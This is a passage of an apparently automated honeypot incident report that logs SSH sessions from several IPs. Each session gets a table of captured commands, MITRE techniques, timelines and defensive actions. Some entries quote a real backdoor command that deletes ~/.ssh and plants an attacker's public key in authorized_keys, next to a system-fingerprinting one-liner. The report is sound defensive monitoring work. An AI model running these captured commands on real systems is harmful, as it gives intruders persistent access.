| `2026-07-06 03:24:57` | `cowrie.command.input` |
| `2026-07-06 03:24:57` | `cowrie.command.input` |
| `2026-07-06 03:24:57` | `cowrie.command.input` |
| `2026-07-06 03:24:57` | `cowrie.log.closed` |
| `2026-07-06 03:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c798b7f343d3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:26 |
| **Last Seen** | 2026-07-06 03:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:26:50` | `cowrie.session.connect` |
| `2026-07-06 03:26:51` | `cowrie.client.version` |
| `2026-07-06 03:26:51` | `cowrie.client.kex` |
| `2026-07-06 03:26:53` | `cowrie.login.success` |
| `2026-07-06 03:26:55` | `cowrie.session.params` |
| `2026-07-06 03:26:55` | `cowrie.command.input` |
| `2026-07-06 03:26:55` | `cowrie.command.input` |
| `2026-07-06 03:26:55` | `cowrie.command.input` |
| `2026-07-06 03:26:55` | `cowrie.command.input` |
| `2026-07-06 03:26:55` | `cowrie.command.input` |
| `2026-07-06 03:26:55` | `cowrie.command.success` |
| `2026-07-06 03:26:55` | `cowrie.command.input` |
| `2026-07-06 03:26:55` | `cowrie.command.input` |
| `2026-07-06 03:26:55` | `cowrie.command.input` |
| `2026-07-06 03:26:55` | `cowrie.command.input` |
| `2026-07-06 03:26:55` | `cowrie.log.closed` |
| `2026-07-06 03:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6041704f195

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:27 |
| **Last Seen** | 2026-07-06 03:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:27:49` | `cowrie.session.connect` |
| `2026-07-06 03:27:50` | `cowrie.client.version` |
| `2026-07-06 03:27:50` | `cowrie.client.kex` |
| `2026-07-06 03:27:52` | `cowrie.login.success` |
| `2026-07-06 03:27:54` | `cowrie.session.params` |
| `2026-07-06 03:27:54` | `cowrie.command.input` |
| `2026-07-06 03:27:54` | `cowrie.command.input` |
| `2026-07-06 03:27:54` | `cowrie.command.input` |
| `2026-07-06 03:27:54` | `cowrie.command.input` |
| `2026-07-06 03:27:54` | `cowrie.command.input` |
| `2026-07-06 03:27:54` | `cowrie.command.success` |
| `2026-07-06 03:27:54` | `cowrie.command.input` |
| `2026-07-06 03:27:54` | `cowrie.command.input` |
| `2026-07-06 03:27:54` | `cowrie.command.input` |
| `2026-07-06 03:27:54` | `cowrie.command.input` |
| `2026-07-06 03:27:54` | `cowrie.log.closed` |
| `2026-07-06 03:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e7e58d03a7c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 03:28 |
| **Last Seen** | 2026-07-06 03:28 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:28:14` | `cowrie.session.connect` |
| `2026-07-06 03:28:15` | `cowrie.client.version` |
| `2026-07-06 03:28:15` | `cowrie.client.kex` |
| `2026-07-06 03:28:21` | `cowrie.login.success` |
| `2026-07-06 03:28:24` | `cowrie.session.params` |
| `2026-07-06 03:28:24` | `cowrie.command.input` |
| `2026-07-06 03:28:26` | `cowrie.log.closed` |
| `2026-07-06 03:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac8289b8f1a7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 03:28 |
| **Last Seen** | 2026-07-06 03:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:28:32` | `cowrie.session.connect` |
| `2026-07-06 03:28:32` | `cowrie.client.version` |
| `2026-07-06 03:28:32` | `cowrie.client.kex` |
| `2026-07-06 03:28:33` | `cowrie.login.success` |
| `2026-07-06 03:28:33` | `cowrie.direct-tcpip.request` |
| `2026-07-06 03:28:33` | `cowrie.direct-tcpip.data` |
| `2026-07-06 03:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8530fc521971

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:28 |
| **Last Seen** | 2026-07-06 03:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:28:48` | `cowrie.session.connect` |
| `2026-07-06 03:28:49` | `cowrie.client.version` |
| `2026-07-06 03:28:49` | `cowrie.client.kex` |
| `2026-07-06 03:28:51` | `cowrie.login.success` |
| `2026-07-06 03:28:53` | `cowrie.session.params` |
| `2026-07-06 03:28:53` | `cowrie.command.input` |
| `2026-07-06 03:28:53` | `cowrie.command.input` |
| `2026-07-06 03:28:53` | `cowrie.command.input` |
| `2026-07-06 03:28:53` | `cowrie.command.input` |
| `2026-07-06 03:28:53` | `cowrie.command.input` |
| `2026-07-06 03:28:53` | `cowrie.command.success` |
| `2026-07-06 03:28:53` | `cowrie.command.input` |
| `2026-07-06 03:28:53` | `cowrie.command.input` |
| `2026-07-06 03:28:53` | `cowrie.command.input` |
| `2026-07-06 03:28:53` | `cowrie.command.input` |
| `2026-07-06 03:28:54` | `cowrie.log.closed` |
| `2026-07-06 03:28:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c12dc06b93c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:29 |
| **Last Seen** | 2026-07-06 03:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:29:48` | `cowrie.session.connect` |
| `2026-07-06 03:29:49` | `cowrie.client.version` |
| `2026-07-06 03:29:49` | `cowrie.client.kex` |
| `2026-07-06 03:29:51` | `cowrie.login.success` |
| `2026-07-06 03:29:52` | `cowrie.session.params` |
| `2026-07-06 03:29:52` | `cowrie.command.input` |
| `2026-07-06 03:29:52` | `cowrie.command.input` |
| `2026-07-06 03:29:52` | `cowrie.command.input` |
| `2026-07-06 03:29:52` | `cowrie.command.input` |
| `2026-07-06 03:29:52` | `cowrie.command.input` |
| `2026-07-06 03:29:53` | `cowrie.command.success` |
| `2026-07-06 03:29:53` | `cowrie.command.input` |
| `2026-07-06 03:29:53` | `cowrie.command.input` |
| `2026-07-06 03:29:53` | `cowrie.command.input` |
| `2026-07-06 03:29:53` | `cowrie.command.input` |
| `2026-07-06 03:29:53` | `cowrie.log.closed` |
| `2026-07-06 03:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f53bee6a916

| Field | Detail |
|---|---|
| **Source IP** | `171.8.40[.]107` |
| **First Seen** | 2026-07-06 03:29 |
| **Last Seen** | 2026-07-06 03:30 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:29:56` | `cowrie.session.connect` |
| `2026-07-06 03:29:58` | `cowrie.client.version` |
| `2026-07-06 03:29:58` | `cowrie.client.kex` |
| `2026-07-06 03:29:59` | `cowrie.login.success` |
| `2026-07-06 03:30:00` | `cowrie.session.params` |
| `2026-07-06 03:30:00` | `cowrie.command.input` |
| `2026-07-06 03:30:00` | `cowrie.command.failed` |
| `2026-07-06 03:30:00` | `cowrie.log.closed` |
| `2026-07-06 03:30:01` | `cowrie.session.params` |
| `2026-07-06 03:30:01` | `cowrie.command.input` |
| `2026-07-06 03:30:01` | `cowrie.session.file_download` |
| `2026-07-06 03:30:01` | `cowrie.log.closed` |
| `2026-07-06 03:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.8.40[.]107` to AbuseIPDB if not already reported
- [ ] Block `171.8.40[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-135f188f39a1

| Field | Detail |
|---|---|
| **Source IP** | `171.8.40[.]107` |
| **First Seen** | 2026-07-06 03:30 |
| **Last Seen** | 2026-07-06 03:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:30:10` | `cowrie.session.connect` |
| `2026-07-06 03:30:11` | `cowrie.client.version` |
| `2026-07-06 03:30:11` | `cowrie.client.kex` |
| `2026-07-06 03:30:12` | `cowrie.login.success` |
| `2026-07-06 03:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.8.40[.]107` to AbuseIPDB if not already reported
- [ ] Block `171.8.40[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4880ff1f16b4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:30 |
| **Last Seen** | 2026-07-06 03:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:30:48` | `cowrie.session.connect` |
| `2026-07-06 03:30:48` | `cowrie.client.version` |
| `2026-07-06 03:30:48` | `cowrie.client.kex` |
| `2026-07-06 03:30:51` | `cowrie.login.success` |
| `2026-07-06 03:30:52` | `cowrie.session.params` |
| `2026-07-06 03:30:52` | `cowrie.command.input` |
| `2026-07-06 03:30:52` | `cowrie.command.input` |
| `2026-07-06 03:30:52` | `cowrie.command.input` |
| `2026-07-06 03:30:52` | `cowrie.command.input` |
| `2026-07-06 03:30:52` | `cowrie.command.input` |
| `2026-07-06 03:30:52` | `cowrie.command.success` |
| `2026-07-06 03:30:52` | `cowrie.command.input` |
| `2026-07-06 03:30:52` | `cowrie.command.input` |
| `2026-07-06 03:30:52` | `cowrie.command.input` |
| `2026-07-06 03:30:52` | `cowrie.command.input` |
| `2026-07-06 03:30:53` | `cowrie.log.closed` |
| `2026-07-06 03:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cda2a9eb0d73

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]245` |
| **First Seen** | 2026-07-06 03:31 |
| **Last Seen** | 2026-07-06 03:36 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:31:20` | `cowrie.session.connect` |
| `2026-07-06 03:31:20` | `cowrie.client.version` |
| `2026-07-06 03:31:21` | `cowrie.client.kex` |
| `2026-07-06 03:31:22` | `cowrie.login.success` |
| `2026-07-06 03:31:23` | `cowrie.session.params` |
| `2026-07-06 03:31:23` | `cowrie.command.input` |
| `2026-07-06 03:31:23` | `cowrie.command.failed` |
| `2026-07-06 03:31:24` | `cowrie.log.closed` |
| `2026-07-06 03:31:24` | `cowrie.session.params` |
| `2026-07-06 03:31:24` | `cowrie.command.input` |
| `2026-07-06 03:31:25` | `cowrie.session.file_download` |
| `2026-07-06 03:31:25` | `cowrie.log.closed` |
| `2026-07-06 03:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]245` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb09b140ebed

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:31 |
| **Last Seen** | 2026-07-06 03:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:31:47` | `cowrie.session.connect` |
| `2026-07-06 03:31:48` | `cowrie.client.version` |
| `2026-07-06 03:31:48` | `cowrie.client.kex` |
| `2026-07-06 03:31:50` | `cowrie.login.success` |
| `2026-07-06 03:31:52` | `cowrie.session.params` |
| `2026-07-06 03:31:52` | `cowrie.command.input` |
| `2026-07-06 03:31:52` | `cowrie.command.input` |
| `2026-07-06 03:31:52` | `cowrie.command.input` |
| `2026-07-06 03:31:52` | `cowrie.command.input` |
| `2026-07-06 03:31:52` | `cowrie.command.input` |
| `2026-07-06 03:31:52` | `cowrie.command.success` |
| `2026-07-06 03:31:52` | `cowrie.command.input` |
| `2026-07-06 03:31:52` | `cowrie.command.input` |
| `2026-07-06 03:31:52` | `cowrie.command.input` |
| `2026-07-06 03:31:52` | `cowrie.command.input` |
| `2026-07-06 03:31:53` | `cowrie.log.closed` |
| `2026-07-06 03:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61d06152d405

| Field | Detail |
|---|---|
| **Source IP** | `14.103.115[.]237` |
| **First Seen** | 2026-07-06 03:32 |
| **Last Seen** | 2026-07-06 03:37 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:32:03` | `cowrie.session.connect` |
| `2026-07-06 03:32:03` | `cowrie.client.version` |
| `2026-07-06 03:32:04` | `cowrie.client.kex` |
| `2026-07-06 03:32:04` | `cowrie.login.success` |
| `2026-07-06 03:32:06` | `cowrie.session.params` |
| `2026-07-06 03:32:06` | `cowrie.command.input` |
| `2026-07-06 03:32:06` | `cowrie.command.failed` |
| `2026-07-06 03:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.115[.]237` to AbuseIPDB if not already reported
- [ ] Block `14.103.115[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b1904ce8b3d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:32 |
| **Last Seen** | 2026-07-06 03:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:32:46` | `cowrie.session.connect` |
| `2026-07-06 03:32:46` | `cowrie.client.version` |
| `2026-07-06 03:32:46` | `cowrie.client.kex` |
| `2026-07-06 03:32:49` | `cowrie.login.success` |
| `2026-07-06 03:32:51` | `cowrie.session.params` |
| `2026-07-06 03:32:51` | `cowrie.command.input` |
| `2026-07-06 03:32:51` | `cowrie.command.input` |
| `2026-07-06 03:32:51` | `cowrie.command.input` |
| `2026-07-06 03:32:51` | `cowrie.command.input` |
| `2026-07-06 03:32:51` | `cowrie.command.input` |
| `2026-07-06 03:32:51` | `cowrie.command.success` |
| `2026-07-06 03:32:51` | `cowrie.command.input` |
| `2026-07-06 03:32:51` | `cowrie.command.input` |
| `2026-07-06 03:32:51` | `cowrie.command.input` |
| `2026-07-06 03:32:51` | `cowrie.command.input` |
| `2026-07-06 03:32:52` | `cowrie.log.closed` |
| `2026-07-06 03:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4b1edc003ff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:33 |
| **Last Seen** | 2026-07-06 03:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:33:45` | `cowrie.session.connect` |
| `2026-07-06 03:33:46` | `cowrie.client.version` |
| `2026-07-06 03:33:46` | `cowrie.client.kex` |
| `2026-07-06 03:33:48` | `cowrie.login.success` |
| `2026-07-06 03:33:50` | `cowrie.session.params` |
| `2026-07-06 03:33:50` | `cowrie.command.input` |
| `2026-07-06 03:33:50` | `cowrie.command.input` |
| `2026-07-06 03:33:50` | `cowrie.command.input` |
| `2026-07-06 03:33:50` | `cowrie.command.input` |
| `2026-07-06 03:33:50` | `cowrie.command.input` |
| `2026-07-06 03:33:50` | `cowrie.command.success` |
| `2026-07-06 03:33:50` | `cowrie.command.input` |
| `2026-07-06 03:33:50` | `cowrie.command.input` |
| `2026-07-06 03:33:50` | `cowrie.command.input` |
| `2026-07-06 03:33:50` | `cowrie.command.input` |
| `2026-07-06 03:33:51` | `cowrie.log.closed` |
| `2026-07-06 03:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
